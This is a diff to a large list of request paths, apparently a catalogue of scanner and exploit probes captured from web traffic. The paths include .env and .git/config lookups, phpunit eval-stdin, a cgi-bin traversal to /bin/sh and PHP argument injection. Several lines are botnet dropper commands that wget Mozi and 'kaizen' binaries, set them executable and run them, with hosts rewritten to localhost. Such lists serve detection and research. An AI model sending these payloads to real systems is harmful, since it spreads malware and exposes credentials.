@@ -272,6 +272,7 @@ vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 .vscode/sftp.json
 app/.git/config
 .env.swp
+owa/auth/logon.aspx
 www/.git/config
 .env.sandbox
 cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
@@ -279,7 +280,6 @@ config/database.php
 configuration/.env
 containers/json
 index.php_%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input
-owa/auth/logon.aspx
 vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
 version
 .htpasswd
@@ -3941,6 +3941,7 @@ cdn/.env
 cert.pem_v=18e6211c771c1705
 cert.zip
 cgi-bin/ExportSettings.sh
+cgi-bin/ViewLog.asp
 cgi-bin/cstecgi.cgi
 cgi-bin/main.pl
 cgi-bin/nas_sharing.cgi_user=messagebus_passwd=_cmd=15_system=aWQ=
@@ -4107,6 +4108,7 @@ core/.env_v=18e62111b26a6232
 core/.env_v=jyDte
 core/info.php
 core/modules/system/
+core/static/css/standard-ui.css
 cpresources/
 craft/.env
 credentials%252exml
@@ -4998,6 +5000,7 @@ shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:37019/Mozi.a_chmod+777+Mozi.a_
 shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:39791/Mozi.a_chmod+777+Mozi.a_/tmp/Mozi.a+jaws
 shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:40675/Mozi.a_chmod+777+Mozi.a_/tmp/Mozi.a+jaws
 shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:41886/Mozi.a_chmod+777+Mozi.a_/tmp/Mozi.a+jaws
+shell_cd+/tmp_wget+-q+http://127.0.0.1/a3f8d2/kaizen.mips+-O+.k__chmod+777+.k__./.k+selfrep.jaws__exit_wget+-q+http://127.0.0.1/a3f8d2/kaizen.mpsl+-O+.k__chmod+777+.k__./.k+selfrep.jaws__exit_wget+-q+http://127.0.0.1/a3f8d2/kaizen.arm7+-O+.k__chmod+777+.k__./.k+selfrep.jaws__exit_wget+-q+http://127.0.0.1/a3f8d2/kaizen.arm+-O+.k__chmod+777+.k__./.k+selfrep.jaws
 site-backup.zip_v=18e6211c4ee12c48
 site.zip_v=18e6211c5dadc151
 site/.env_v=18e6211266a83631
